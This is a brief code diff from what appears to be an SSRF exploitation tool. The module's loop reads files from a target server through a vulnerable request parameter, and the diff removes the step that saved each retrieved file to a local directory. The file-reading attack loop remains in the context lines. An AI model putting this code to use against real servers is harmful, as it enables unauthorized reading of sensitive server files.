@@ -35,11 +35,6 @@ class exploit:
         if r is not None:
             default = r.text
 
-            # Create directory to store files
-            directory = requester.host
-            if not os.path.exists(directory):
-                os.makedirs(directory)
-
             for f in self.files:
                 r = requester.do_request(args.param, wrapper_file(f))
                 diff = diff_text(r.text, default)
@@ -48,16 +43,6 @@ class exploit:
                     # Display diff between default and ssrf request
                     logging.info("\033[32mReading file\033[0m : {}".format(f))
                     logging.debug(diff)
-
-                    # Write diff to a file
-                    filename = f.replace("\\", "_").replace("/", "_")
-                    logging.info(
-                        "\033[32mWriting file\033[0m : {} to {}".format(
-                            f, directory + "/" + filename
-                        )
-                    )
-                    with open(directory + "/" + filename, "w") as f:
-                        f.write(diff)
 
         else:
             logging.info("Empty response")
